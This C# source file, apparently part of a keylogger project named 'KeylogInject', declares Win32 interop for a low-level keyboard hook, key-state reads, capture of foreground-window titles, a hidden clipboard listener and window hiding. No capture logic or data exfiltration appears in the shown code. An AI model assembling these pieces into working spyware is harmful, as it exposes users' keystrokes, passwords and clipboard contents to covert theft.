using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;

namespace KeylogInject
{
    static class Native
    {
        internal delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        //Reference https://docs.microsoft.com/en-us/windows/desktop/dataxchg/wm-clipboardupdate
        public const int WM_CLIPBOARDUPDATE = 0x031D;
        //Reference https://www.pinvoke.net/default.aspx/Constants.HWND
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        //Reference https://www.pinvoke.net/default.aspx/user32/AddClipboardFormatListener.html
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        //Reference https://www.pinvoke.net/default.aspx/user32.setparent
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        //Reference https://www.pinvoke.net/default.aspx/user32.getwindowtextlength
        [DllImport("user32.dll")]
        public static extern int GetWindowTextLength(IntPtr hWnd);
    }
}
